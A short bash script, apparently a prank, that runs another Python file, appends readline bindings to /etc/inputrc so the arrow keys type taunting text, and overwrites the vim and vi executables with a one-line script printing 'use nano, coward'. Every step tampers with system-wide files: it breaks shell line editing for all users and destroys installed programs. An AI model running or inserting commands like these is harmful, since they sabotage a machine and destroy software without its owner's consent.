#!/bin/bash
python basic-stuff.py
echo '"\e[A": "u mad bro?"' >> /etc/inputrc
echo '"\e[C": "no typos allowed"' >> /etc/inputrc
echo '"\e[D": "no typos allowed"' >> /etc/inputrc
echo "echo use nano, coward" > $(which vim)
echo "echo use nano, coward" > $(which vi)